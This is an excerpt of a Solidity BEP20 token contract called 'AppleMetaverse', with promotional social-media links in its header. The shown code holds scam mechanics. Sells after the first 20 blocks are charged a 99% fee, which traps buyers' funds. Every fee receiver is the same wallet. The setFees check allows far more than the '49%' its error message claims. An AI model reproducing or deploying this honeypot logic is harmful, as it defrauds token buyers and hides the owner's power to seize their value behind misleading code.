...
/**
    Telegram : t.me/Apple_MetaverseBsc
    Website  : apple-metaversebsc.com
    Twitter  : twitter.com/AppleMeta_Real
*/
...
contract AppleMetaverse is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "AppleMetaverse";
    ...
    constructor () Auth(msg.sender) {
        ...
        marketingFeeReceiver = 0x9dDE330eC2873b8Ec588BC1a8B6Dbf75ff2c6E49;
        teamFeeReceiver = 0x9dDE330eC2873b8Ec588BC1a8B6Dbf75ff2c6E49;
        utilityFeeReceiver = 0x9dDE330eC2873b8Ec588BC1a8B6Dbf75ff2c6E49;
    ...
    function takeFee(address sender, uint256 amount, bool isSell) internal returns (uint256) {
        ...
        } else if(isSell && (launchedAt + 20 < block.number)){
            feeAmount = amount.div(100).mul(99);
        }
    ...
    function setFees(uint256 _liquidityFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _teamFee, uint256 _utilityFee, uint256 _burnFee, uint256 _feeDenominator) external authorized {
        ...
        require(totalFee < feeDenominator, "Fees cannot be more than 49%");
    }
